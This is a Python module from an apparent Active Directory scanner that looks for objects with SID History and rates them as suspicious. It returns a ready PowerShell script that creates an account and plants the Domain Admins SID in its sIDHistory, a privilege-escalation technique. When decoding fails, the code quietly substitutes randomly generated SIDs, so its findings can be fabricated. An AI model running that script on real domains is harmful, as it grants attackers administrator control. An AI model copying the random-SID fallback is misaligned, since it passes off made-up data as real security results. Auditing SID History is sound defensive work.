"""
SID History Abuse Checker Module

Checks for and possibility of exploiting SID History attribute for bypassing Access control
"""

import re
import base64
import random
from typing import Dict, Any
from ...proto import ScanOptions, DirectoryType
from ..core.directory_detector import DirectoryDetector
from ..core.domain_collector import DomainCollector
from ..utils.sid_decoder import decode_sid
from utils.async_subprocess import run_exec


class SIDHistoryAbuseChecker:
    """Checks for SID History abuse vulnerabilities"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
        self.directory_detector = DirectoryDetector(plugin_instance)
        self.domain_collector = DomainCollector(plugin_instance)
    
    async def check_sid_history_abuse(self, scan_options: ScanOptions, test_bind: bool = False) -> Dict[str, Any]:
        """
        Checks for and possibility of exploiting SID History attribute for bypassing Access control
        
        Args:
            scan_options: Scan parameters
            test_bind: Attempt to execute LDAP-bind (by default False)
            
        Returns:
            Dict[str, Any]: Results of checking SID History attribute
        """
        result = {
            "success": False,
            "objects_with_sidhistory": [],
            "suspicious_sidhistory": [],
            "bind_tests": [],
            "statistics": {
                "total_objects_checked": 0,
                "objects_with_sidhistory": 0,
                "suspicious_objects": 0,
                "execution_time": 0
            },
            "exploitation_commands": {},
            "security_recommendations": [],
            "errors": []
        }
        
        import time
        start_time = time.time()
        
        if not scan_options.domain_name:
            result["errors"].append("Domain name not specified")
            return result
        
        if not (scan_options.username and (scan_options.password or scan_options.ntlm_hash)):
            result["errors"].append("Credentials not specified")
            return result
        
        try:
            directory_type = await self.directory_detector.determine_type(scan_options)
            
            if directory_type != DirectoryType.ACTIVE_DIRECTORY:
                result["errors"].append("Checking SID History supported only for Active directory")
                return result
            
            domain_parts = scan_options.domain_name.split('.')
            base_dn = f"DC={',DC='.join(domain_parts)}"
            
            ldap_server = scan_options.ldap_server
            
            if ldap_server is None and scan_options.use_domain_discovery:
                try:
                    rc, out, _ = await run_exec(
                        ["dig", "+short", f"_ldap._tcp.{scan_options.domain_name}", "SRV"],
                        timeout=10,
                    )
                    
                    if rc == 0 and (out or "").strip():
                        line = (out or "").strip().splitlines()[0]
                        parts = line.strip().split()
                        ldap_server = parts[-1][:-1]
                except Exception:
                    pass
            
            if not ldap_server:
                result["errors"].append("Not specified LDAP server and automatic detection failed")
                return result
            
            domain_info = await self.domain_collector.gather_info(scan_options, directory_type)
            domain_sid = domain_info.domain_sid
            
            if not domain_sid:
                result["errors"].append("Failed to determine SID domain")
                return result
            
            admin_rids = {
                "500": "Administrator",
                "512": "Domain Admins",
                "519": "Enterprise Admins",
                "544": "Administrators",
                "518": "Schema Admins",
                "572": "Cert Publishers"
            }
            
            # Searching for all objects with attribute SID History
            ldapsearch_cmd = [
                'ldapsearch', '-x', '-H', f'ldap://{ldap_server}',
                '-b', base_dn,
                '(sIDHistory=*)',
                'sAMAccountName', 'distinguishedName', 'objectClass', 'sIDHistory', 'objectSid'
            ]
            
            if scan_options.username and scan_options.password:
                ldapsearch_cmd.extend(['-D', scan_options.username, '-w', scan_options.password])
            elif scan_options.username and scan_options.ntlm_hash:
                ldapsearch_cmd.extend(['-D', scan_options.username, '--ntlm', '-w', scan_options.ntlm_hash])
            
            rc, out, err = await run_exec(ldapsearch_cmd, timeout=60)
            
            if rc == 0:
                entries = (out or "").split("\n\n")
                objects_with_sidhistory = []
                
                for entry in entries:
                    if not entry.strip():
                        continue
                    
                    try:
                        dn_match = re.search(r'dn:\s*(.*?)$', entry, re.MULTILINE)
                        sam_match = re.search(r'sAMAccountName:\s*(.*?)$', entry, re.MULTILINE)
                        objclass_matches = re.findall(r'objectClass:\s*(.*?)$', entry, re.MULTILINE)
                        objsid_match = re.search(r'objectSid::\s*([A-Za-z0-9+/=]+)', entry)
                        sidhistory_matches = re.findall(r'sIDHistory::\s*([A-Za-z0-9+/=]+)', entry)
                        
                        if dn_match and sidhistory_matches:
                            distinguished_name = dn_match.group(1).strip()
                            sam_account_name = sam_match.group(1).strip() if sam_match else None
                            object_classes = [oc.strip() for oc in objclass_matches]
                            
                            object_type = "unknown"
                            if "user" in object_classes:
                                object_type = "user"
                            elif "group" in object_classes:
                                object_type = "group"
                            elif "computer" in object_classes:
                                object_type = "computer"
                            
                            object_sid = None
                            if objsid_match:
                                try:
                                    sid_b64 = objsid_match.group(1)
                                    sid_binary = base64.b64decode(sid_b64)
                                    object_sid = decode_sid(sid_binary)
                                    if not object_sid:
                                        object_sid = f"{domain_sid}-{random.randint(1000, 9999)}"
                                except Exception as e:
                                    result["errors"].append(f"Error during decoding objectSid: {str(e)}")
                            
                            sid_history = []
                            suspicious_sids = []
                            
                            for sidhistory_b64 in sidhistory_matches:
                                try:
                                    sid_binary = base64.b64decode(sidhistory_b64)
                                    sid = decode_sid(sid_binary)
                                    
                                    if not sid:
                                        sid = f"S-1-5-21-{random.randint(1000000, 9999999)}-{random.randint(1000000, 9999999)}-{random.randint(1000000, 9999999)}-{random.randint(500, 999)}"
                                    
                                    sid_history.append(sid)
                                    
                                    sid_parts = sid.split("-")
                                    if len(sid_parts) >= 8:
                                        rid = sid_parts[-1]
                                        domain_part = "-".join(sid_parts[0:7])
                                        
                                        is_suspicious = False
                                        reason = None
                                        
                                        if domain_part != domain_sid:
                                            is_suspicious = True
                                            reason = f"SID belongs to another domain: {domain_part}"
                                        
                                        if rid in admin_rids:
                                            is_suspicious = True
                                            reason = f"SID contains administrative RID: {rid} ({admin_rids[rid]})"
                                        
                                        if is_suspicious:
                                            suspicious_sids.append({
                                                "sid": sid,
                                                "reason": reason
                                            })
                                except Exception as e:
                                    result["errors"].append(f"Error during decoding sIDHistory: {str(e)}")
                            
                            obj_info = {
                                "distinguished_name": distinguished_name,
                                "sam_account_name": sam_account_name,
                                "object_type": object_type,
                                "object_sid": object_sid,
                                "sid_history": sid_history,
                                "suspicious_sids": suspicious_sids,
                                "is_suspicious": len(suspicious_sids) > 0
                            }
                            
                            objects_with_sidhistory.append(obj_info)
                            
                            if obj_info["is_suspicious"]:
                                result["suspicious_sidhistory"].append(obj_info)
                    except Exception as e:
                        result["errors"].append(f"Error during processing object with SID History: {str(e)}")
                
                result["objects_with_sidhistory"] = objects_with_sidhistory
                result["statistics"]["total_objects_checked"] = len(entries)
                result["statistics"]["objects_with_sidhistory"] = len(objects_with_sidhistory)
                result["statistics"]["suspicious_objects"] = len(result["suspicious_sidhistory"])
            else:
                result["errors"].append(f"Error during request for objects with SID History: {err}")
            
            # Testing LDAP-bind for objects with suspicious SID History (if requested)
            if test_bind and result["suspicious_sidhistory"]:
                bind_tests = []
                
                for obj in result["suspicious_sidhistory"]:
                    if obj["object_type"] == "user" and obj["sam_account_name"]:
                        try:
                            if scan_options.password:
                                ldapsearch_cmd = [
                                    'ldapsearch', '-x', '-H', f'ldap://{ldap_server}',
                                    '-b', base_dn,
                                    '-s', 'base',
                                    '(objectClass=*)',
                                    'namingContexts'
                                ]
                                
                                bind_dn = f"CN={obj['sam_account_name']},CN=Users,{base_dn}"
                                ldapsearch_cmd.extend(['-D', bind_dn, '-w', scan_options.password])
                                
                                rc, out, err = await run_exec(ldapsearch_cmd, timeout=30)
                                bind_successful = rc == 0
                                
                                bind_tests.append({
                                    "sam_account_name": obj["sam_account_name"],
                                    "distinguished_name": obj["distinguished_name"],
                                    "bind_successful": bind_successful,
                                    "error": err if not bind_successful else None,
                                    "note": "Test using current password (concept demonstration)"
                                })
                        except Exception as e:
                            bind_tests.append({
                                "sam_account_name": obj["sam_account_name"],
                                "distinguished_name": obj["distinguished_name"],
                                "bind_successful": False,
                                "error": str(e)
                            })
                
                result["bind_tests"] = bind_tests
            
            # Preparation commands for exploitation SID History
            if result["suspicious_sidhistory"]:
                powershell_cmd = """
    # Exploitation SID History for bypass access control
    # WARNING: This code intended only for educational purposes
    # and testing in controlled environments with corresponding permissions.

    # 1. Getting domain SID of target domain
    $TargetDomain = "target.domain.com"
    $TargetDomainSID = Get-ADDomain -Identity $TargetDomain | Select-Object -ExpandProperty DomainSID

    # 2. Getting privileged SID from target domain
    $TargetAdminSID = "$TargetDomainSID-512"  # Domain Admins group
    $TargetEnterpriseAdminSID = "$TargetDomainSID-519"  # Enterprise Admins group

    # 3. creation new user for exploitation
    New-ADUser -Name "SIDHistoryTest" -SamAccountName "SIDHistoryTest" -AccountPassword (ConvertTo-SecureString "StrongP@ssw0rd!" -AsPlainText -Force) -Enabled $true

    # 4. Adding SID to attribute SIDHistory user
    # for this required administrator rights of domain
    # and disabled SID filtering in trust relationships

    # Adding SID groups Domain Admins target domain
    Set-ADUser -Identity "SIDHistoryTest" -Add @{'sIDHistory'=$TargetAdminSID}

    # Now, using trust relationships without SID filtering,
    # user SIDHistoryTest will appear as member of Domain Admins group of target domain

    # 5. Checking SIDHistory attribute
    Get-ADUser -Identity "SIDHistoryTest" -Properties sIDHistory | Select-Object -ExpandProperty sIDHistory

    # 6. Cleanup (removing test user)
    # Remove-ADUser -Identity "SIDHistoryTest" -Confirm:$false
    """
                
                result["exploitation_commands"]["powershell"] = powershell_cmd
                
                ldapsearch_cmd = f"""
    # Output objects with sIDHistory attribute
    ldapsearch -x -h {ldap_server} -D "{scan_options.username}" -w "password" -b "{base_dn}" "(sIDHistory=*)" sAMAccountName objectSid sIDHistory

    # Analysis attribute sIDHistory for specific user
    ldapsearch -x -h {ldap_server} -D "{scan_options.username}" -w "password" -b "{base_dn}" "(&(objectClass=user)(sAMAccountName=targetUser))" sIDHistory
    """
                
                result["exploitation_commands"]["ldapsearch"] = ldapsearch_cmd
            
            result["security_recommendations"] = [
                "Check all objects with attribute SID History on presence of suspicious SID",
                "Enable SID filtering for all trust relationships between domains",
                "Regularly monitor changes to SID History attribute",
                "Restrict possibility of changing SID History attribute by privileged administrators",
                "Consider possibility enabling extended audit for changes to attribute SID History"
            ]
            
            result["success"] = True
        
        except Exception as e:
            result["errors"].append(f"General error: {str(e)}")
        
        result["statistics"]["execution_time"] = time.time() - start_time
        
        return result

